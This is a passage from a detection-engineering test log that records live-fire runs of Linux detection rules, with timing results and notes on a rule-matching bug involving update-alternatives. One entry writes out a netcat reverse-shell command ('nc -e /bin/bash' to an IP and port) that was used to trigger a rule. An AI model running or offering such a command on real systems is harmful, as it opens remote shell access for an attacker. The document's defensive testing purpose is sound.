  status: true_positive
  mttd_seconds: null
  last_run: "2026-08-16"
  notes: "Fired correctly as part of the same batch live-fire pass. Also caught and fixed a real bug: the deployed rule originally matched vi/vim via process.executable, but update-alternatives resolves both to /usr/bin/vim.basic on this host, so that path would have silently never matched a real vi/vim invocation. Fixed by matching process.name instead (see docs/build-log.md); this specific detection path (vi /etc/passwd) was not individually re-tested after the fix since the id-command path already confirms the rule fires, but the same class of bug is fully explained and fixed below for netcat."

- rule_id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
  rule_file: rules/proc_creation_lnx_netcat_reverse_shell.yml
  technique: T1059
  atomic_test: "Curated from SigmaHQ, live-fired with a real command (timeout 1 nc -e /bin/bash 192.0.2.1 4444)"
  status: true_positive
  mttd_seconds: 45
  last_run: "2026-08-16"
  notes: "First attempt fired 0/1 -- root-caused to a real bug, not a synthetic one: this project's rules generally translate Sigma's Image|endswith convention to process.executable like~, but nc resolves via update-alternatives to /usr/bin/nc.openbsd on Debian/Ubuntu, so process.executable never ends with \"/nc\" for a real nc invocation even though the user typed \"nc\". process.name (the invoked basename, not the resolved path) correctly shows \"nc\". Fixed by matching process.name in (\"nc\",\"ncat\") instead, redeployed, re-fired in isolation: command executed 22:21:55Z, alert start 22:22:40Z -- 45s, the fastest real MTTD measured in this project so far. The same class of bug was proactively checked for and fixed in the local_account rule's vi/vim matching too (see above); a quick check of the other rules' referenced binaries (cat, dd, id, crontab, curl, wget, base64, rm/cp/mv/tee) found none of them aliased via update-alternatives on this host."

